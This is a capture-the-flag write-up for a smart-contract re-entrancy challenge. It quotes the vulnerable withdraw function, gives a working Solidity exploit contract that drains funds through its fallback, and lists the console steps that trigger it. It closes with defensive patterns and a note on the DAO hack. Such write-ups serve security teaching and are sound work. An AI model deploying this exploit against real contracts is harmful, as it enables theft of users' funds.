# 10. Re-entrancy
<sup>Difficulty 6/10</sup>

The goal of this level is for you to steal all the funds from the contract.

Things that might help:

- Untrusted contracts can execute code where you least expect it.
- Fallback methods
- Throw/revert bubbling
- Sometimes the best way to attack a contract is with another contract.
- See the Help page above, section "Beyond the console"

## Solution

As the name states, we need to perform a reentrancy attack. 

The vulnerable function is:

```solidity
function withdraw(uint _amount) public {
	if(balances[msg.sender] >= _amount) {
		(bool result,) = msg.sender.call{value:_amount}("");
		if(result) {
			_amount;
		}
		balances[msg.sender] -= _amount;
	}
}
```

We can create a contract and use the fallback method to call the `withdraw` function over and over. This behavior is exploitable since the sender balance is updated after the `call` function and there is no lock functionality for the function. 

For more information check [Reentrancy attack](https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/)

Create and deploy the Exploit contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ExploitContract {
    address payable reentranctContractAddress = 0x7B33B7c60Aa888a75DB301e882142a05FEDe9C1f;
    Reentrance reentranceContract = Reentrance(reentranctContractAddress);

    function exploit() public {
        reentranceContract.withdraw(0.001 ether);
    }

    receive() external payable {
        reentranceContract.withdraw(0.001 ether);
    }
}
```

Get the contract address (`0x243AE9Ccd43E72e0F3E8625631057D4CB2F133c6`) and feed with some ETH to pass the `balances[msg.sender] >= _amount` check:

```javascript
const exploitContractAddr = '0x243AE9Ccd43E72e0F3E8625631057D4CB2F133c6'
await contract.donate(exploitContractAddr, {value: toWei('0.001')})
fromWei((await contract.balanceOf(exploitContractAddr)).words.join(''))
// -> '0.001300889614901161'
```

Now we can run the exploit function and complete the challenge \_\m/

## OZ Corner

In order to prevent re-entrancy attacks when moving funds out of your contract, use the [Checks-Effects-Interactions pattern](https://solidity.readthedocs.io/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern) being aware that `call` will only return false without interrupting the execution flow. Solutions such as [ReentrancyGuard](https://docs.openzeppelin.com/contracts/2.x/api/utils#ReentrancyGuard) or [PullPayment](https://docs.openzeppelin.com/contracts/2.x/api/payment#PullPayment) can also be used.

`transfer` and `send` are no longer recommended solutions as they can potentially break contracts after the Istanbul hard fork [Source 1](https://diligence.consensys.net/blog/2019/09/stop-using-soliditys-transfer-now/) [Source 2](https://forum.openzeppelin.com/t/reentrancy-after-istanbul/1742).

Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and re-enter your contract, possibly messing up your state/logic.

Re-entrancy is a common attack. You should always be prepared for it!

### The DAO Hack
The famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. See [15 lines of code that could have prevented TheDAO Hack](https://blog.openzeppelin.com/15-lines-of-code-that-could-have-prevented-thedao-hack-782499e00942).
